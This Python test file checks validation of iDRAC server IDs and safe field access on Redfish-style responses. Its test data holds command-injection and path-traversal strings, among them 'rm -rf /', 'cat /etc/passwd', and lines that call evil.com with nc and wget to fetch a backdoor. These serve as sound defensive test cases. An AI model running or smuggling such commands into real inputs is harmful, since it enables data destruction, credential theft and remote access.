"""Tests for iDRAC validation utilities."""

import pytest
import sys
import os

# Add src directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src', 'utils'))

from validation import validate_server_id, safe_get_field, safe_get_nested_field


class TestServerIDValidation:
    """Test server ID validation."""
    
    def test_valid_server_ids(self):
        """Test valid server IDs."""
        valid_ids = [
            "server1",
            "server-2",
            "server_3",
            "my-server",
            "test_server",
            "SERVER",
            "server-123_test"
        ]
        
        for server_id in valid_ids:
            assert validate_server_id(server_id) is True, f"Expected '{server_id}' to be valid"
    
    def test_invalid_server_ids(self):
        """Test invalid server IDs with injection attempts."""
        invalid_ids = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "server; rm -rf /",  # Command injection
            "server && reboot",  # Command injection
            "server | cat /etc/passwd",  # Command injection
            "server`whoami`",  # Command injection
            "server$(id)",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "server/../../../etc",  # Path traversal
            "server with spaces",  # Spaces not allowed
            "server.with.dots",  # Dots not allowed
            "server/with/slashes",  # Slashes not allowed
            "server\\with\\backslashes",  # Backslashes not allowed
            "server@host",  # Special chars not allowed
            "server#123",  # Special chars not allowed
            "a" * 150,  # Too long
        ]
        
        for server_id in invalid_ids:
            assert validate_server_id(server_id) is False, f"Expected '{server_id}' to be invalid"


class TestSafeFieldAccess:
    """Test safe field access utilities."""
    
    def test_safe_get_field_exists(self):
        """Test getting existing field."""
        data = {"key1": "value1", "key2": 123, "key3": None}
        
        assert safe_get_field(data, "key1") == "value1"
        assert safe_get_field(data, "key2") == 123
        assert safe_get_field(data, "key3") is None
    
    def test_safe_get_field_missing(self):
        """Test getting missing field returns default."""
        data = {"key1": "value1"}
        
        assert safe_get_field(data, "missing") is None
        assert safe_get_field(data, "missing", "default") == "default"
        assert safe_get_field(data, "missing", 0) == 0
    
    def test_safe_get_field_invalid_input(self):
        """Test handling of invalid input."""
        assert safe_get_field(None, "key") is None
        assert safe_get_field("not a dict", "key") is None
        assert safe_get_field([], "key") is None
        assert safe_get_field(123, "key") is None
    
    def test_safe_get_nested_field_exists(self):
        """Test getting nested field."""
        data = {
            "level1": {
                "level2": {
                    "level3": "value"
                }
            }
        }
        
        assert safe_get_nested_field(data, "level1", "level2", "level3") == "value"
        assert safe_get_nested_field(data, "level1", "level2") == {"level3": "value"}
        assert safe_get_nested_field(data, "level1") == {"level2": {"level3": "value"}}
    
    def test_safe_get_nested_field_missing(self):
        """Test getting missing nested field returns default."""
        data = {
            "level1": {
                "level2": "value"
            }
        }
        
        assert safe_get_nested_field(data, "level1", "missing") is None
        assert safe_get_nested_field(data, "missing", "level2") is None
        assert safe_get_nested_field(data, "level1", "level2", "level3") is None
        assert safe_get_nested_field(data, "level1", "missing", default="default") == "default"
    
    def test_safe_get_nested_field_invalid_path(self):
        """Test handling of invalid path."""
        data = {
            "level1": "string_value"
        }
        
        # Trying to access nested field on non-dict value
        assert safe_get_nested_field(data, "level1", "level2") is None
    
    def test_safe_get_nested_field_redfish_scenario(self):
        """Test typical Redfish API response handling."""
        # Simulate Redfish response
        response = {
            "Status": {
                "Health": "OK",
                "State": "Enabled"
            },
            "ProcessorId": {
                "VendorId": "GenuineIntel",
                "IdentificationRegisters": "0x00050654"
            }
        }
        
        # Existing fields
        assert safe_get_nested_field(response, "Status", "Health") == "OK"
        assert safe_get_nested_field(response, "ProcessorId", "VendorId") == "GenuineIntel"
        
        # Missing optional fields
        assert safe_get_nested_field(response, "Status", "HealthRollup", default="N/A") == "N/A"
        assert safe_get_nested_field(response, "ThermalMetrics", "Temperature", default=0) == 0


class TestSecurityScenarios:
    """Test specific security attack scenarios."""
    
    def test_command_injection_prevention(self):
        """Test that common command injection patterns are blocked."""
        command_injection_patterns = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc evil.com 1234",
            "`whoami`",
            "$(id)",
            "; reboot",
            "&& wget http://evil.com/backdoor.sh",
        ]
        
        for pattern in command_injection_patterns:
            test_input = f"server{pattern}"
            assert validate_server_id(test_input) is False, \
                f"Command injection pattern should be blocked: {pattern}"
    
    def test_path_traversal_prevention(self):
        """Test that path traversal patterns are blocked."""
        path_traversal_patterns = [
            "../",
            "../../",
            "../../../etc/passwd",
            "..\\..\\windows",
        ]
        
        for pattern in path_traversal_patterns:
            assert validate_server_id(pattern) is False, \
                f"Path traversal pattern should be blocked: {pattern}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
